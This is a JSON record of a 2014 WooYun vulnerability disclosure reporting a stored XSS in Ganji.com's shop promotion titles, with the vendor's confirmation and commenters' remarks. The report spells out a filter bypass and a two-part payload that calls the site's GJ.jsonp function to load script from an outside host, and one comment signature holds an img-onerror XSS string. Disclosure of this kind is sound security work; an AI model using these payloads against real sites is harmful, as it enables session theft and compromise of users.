{"id": 476, "wybug_id": "wooyun-2014-075545", "wybug_title": "赶集主站又一存储型XSS（好玩的过滤 + 好玩的Load Hook方法）", "wybug_corp": "赶集网", "wybug_author": "0x_Jin", "wybug_date": "2014-09-09 14:51", "wybug_open_date": "2014-10-24 14:52", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "存储型", "类型应用", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-09：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-29：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-24：\t细节向公众公开  简要描述： 输出点在标签外 过滤规则 不过滤< >  净过滤些乱七八糟的某些功能隐藏在网站代码中，方便了程序员也方便了各位黑阔！ 详细说明：  过滤了 jQuery $ =  script标签不能成对出现否则为空但是留下 < > 就有希望！漏洞存储点在于 赶集的店铺 发布促销活动那。在促销活动的标题那未过滤< >但是过滤jQuery $ =  script标签 并且限制了50个字符 限制了危险字符（不知道这个危险字符代表哪些script都不算）漏洞存在地址：http://cs.ganji.com/fuwu_dian/1141783323x/cuxiao/31701/上图：\n\n在网页中使用了jquery 但是无法使用。。。（此处只想说wtf） 为什么不能用打开网页看下就知道。。。 输出点位置的问题。。。不能用jquery 限制了50个字符 要加载js 怎么弄呢？此处就来了好玩的  先扫描函数 code:for (name in window) { if(name.length<=3){console.log(name)} }扫描函数名长度为小于等于3的函数扫到了这个：\n\n然后来看看这个函数有哪些方法，我看到了这个：\n\n然后我们来看看这个方法的代码是怎样的\n\n美化一下代码 我看到了这个：\n\n哟呵，不错哟，在头部添加个script标签 并且src 可传递进去！于是构造以下payload:script标签不能成对出现，先提交这个促销标题： -->;</script>然后再提交<script>GJ.jsonp('//20.rs')<!--然后访问http://cs.ganji.com/fuwu_dian/1141783323x/cuxiao/31701/ 就执行了20.rs的代码！来看看head部分的dom把：\n\n咯咯，已经进去了！我不会告诉你好多网站都有这样的功能比如5*  他们的函数就叫做loadjs看图：\n\n   漏洞证明：  过滤了 jQuery $ =  script标签不能成对出现否则为空但是留下 < > 就有希望！漏洞存储点在于 赶集的店铺 发布促销活动那。在促销活动的标题那未过滤< >但是过滤jQuery $ =  script标签 并且限制了50个字符 限制了危险字符（不知道这个危险字符代表哪些script都不算）漏洞存在地址：http://cs.ganji.com/fuwu_dian/1141783323x/cuxiao/31701/上图：\n\n在网页中使用了jquery 但是无法使用。。。（此处只想说wtf） 为什么不能用打开网页看下就知道。。。 输出点位置的问题。。。不能用jquery 限制了50个字符 要加载js 怎么弄呢？此处就来了好玩的  先扫描函数 code:for (name in window) { if(name.length<=3){console.log(name)} }扫描函数名长度为小于等于3的函数扫到了这个：\n\n然后来看看这个函数有哪些方法，我看到了这个：\n\n然后我们来看看这个方法的代码是怎样的\n\n美化一下代码 我看到了这个：\n\n哟呵，不错哟，在头部添加个script标签 并且src 可传递进去！于是构造以下payload:script标签不能成对出现，先提交这个促销标题： -->;</script>然后再提交<script>GJ.jsonp('//20.rs')<!--然后访问http://cs.ganji.com/fuwu_dian/1141783323x/cuxiao/31701/ 就执行了20.rs的代码！来看看head部分的dom把：\n\n咯咯，已经进去了！我不会告诉你好多网站都有这样的功能比如5*  他们的函数就叫做loadjs看图：\n\n   修复方案：  还是老一套~ 别把重要的留着不过滤 乱七八糟的过滤 弄的好像挑战赛一样！   版权声明：转载请注明来源 0x_Jin@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-09-09 15:23 厂商回复： 非常感谢您的报告，问题已着手处理，感谢大家对赶集安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-09 14:52 |    \t\tleo335 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        )\t\t \n  这个貌似有点意思:)    \n     2014-09-09 14:53 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  看起来很高端    \n     2014-09-09 14:56 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  XSS 你懂得    \n     2014-09-09 14:59 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  @px1624 好了 别帮我拉仇恨了 我只想安安心心挖个洞 赚点rank wb什么的 就走的    \n     2014-09-09 15:17 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @0x_Jin 哈哈，这次肯定不会1rank的，你放心，厂商有过承诺的了    \n     2014-09-09 15:23 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  @px1624 那就好~ 要不然我就伤心了~    \n     2014-09-09 15:29 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @0x_Jin 起码2rank，(*^__^*) 嘻嘻    \n     2014-09-09 15:30 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  @px1624 给了12.。     \n     2014-09-09 15:36 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @0x_Jin 哈哈，恭喜恭喜，看来貌似官方帐号真的换人了！又可以开心的提交赶集网漏洞了    \n     2014-09-09 15:47 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  怎么感觉大家对赶集之前意见很大的样子？ 貌似错过了什么    \n     2014-09-09 16:11 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  @zeracker  WooYun: 赶集网旗下蚂蚁短租存储形xss盲打后台管理员cookie  看这个你就造了    \n     2014-09-09 17:53 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  换了    \n     2014-10-24 16:03 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  这个有意思哦    \n     2014-10-24 16:25 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  有点意思    \n     2015-01-27 16:21 |    \t\tM4ster \t\t\t( 实习白帽子  |\t\t\t        Rank:39 漏洞数:7        | www.m4ster@gmail.com)\t\t \n  Load Hook，Nice。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}